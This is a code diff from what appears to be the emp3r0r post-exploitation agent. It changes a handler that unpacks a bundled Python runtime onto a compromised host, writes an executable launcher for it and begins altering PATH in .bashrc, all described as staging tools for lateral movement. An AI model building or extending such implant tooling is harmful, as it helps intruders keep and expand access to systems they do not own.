@@ -8,6 +8,7 @@ install tools to emp3r0r_data.UtilsPath, for lateral movement
 
 import (
 	"fmt"
+	"io/ioutil"
 	"log"
 	"os"
 	"strings"
@@ -15,6 +16,18 @@ import (
 	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
 	"github.com/mholt/archiver"
+)
+
+var (
+	PythonArchive = emp3r0r_data.UtilsPath + "/python3.9.tar.xz"
+	PythonPath    = emp3r0r_data.UtilsPath + "/python3.9"
+
+	// run python scripts with this command
+	PythonCmd = fmt.Sprintf("PYTHONPATH=%s PYTHONHOME=%s %s ",
+		PythonPath, PythonPath, emp3r0r_data.UtilsPath+"/python3")
+
+	// run python itself with this script
+	PythonLauncher = fmt.Sprintf("#!%s\n%s"+`"$@"`+"\n", emp3r0r_data.DefaultShell, PythonCmd)
 )
 
 func VaccineHandler() (out string) {
@@ -42,14 +55,20 @@ func VaccineHandler() (out string) {
 	}
 
 	// extract python3.9.tar.xz
-	if util.IsFileExist(emp3r0r_data.UtilsPath + "/python3.9.tar.xz") {
-		if err = archiver.Unarchive(emp3r0r_data.UtilsPath+"/python3.9.tar.xz", emp3r0r_data.UtilsPath); err != nil {
+	os.RemoveAll(PythonPath)
+	if util.IsFileExist(PythonArchive) {
+		if err = archiver.Unarchive(PythonArchive, emp3r0r_data.UtilsPath); err != nil {
 			out = fmt.Sprintf("Unarchive python libs: %v", err)
 			log.Print(out)
 			return
 		}
+		// create launchers
+		err = ioutil.WriteFile(emp3r0r_data.UtilsPath+"/python", []byte(PythonLauncher), 0755)
+		if err != nil {
+			out = fmt.Sprintf("Write python launcher: %v", err)
+		}
 	}
-	_ = os.Remove(emp3r0r_data.AgentRoot + "/utils.tar.bz2")
+	os.Remove(emp3r0r_data.AgentRoot + "/utils.tar.bz2")
 
 	// update PATH in .bashrc
 	exportPATH := fmt.Sprintf("export PATH=%s:$PATH", emp3r0r_data.UtilsPath)
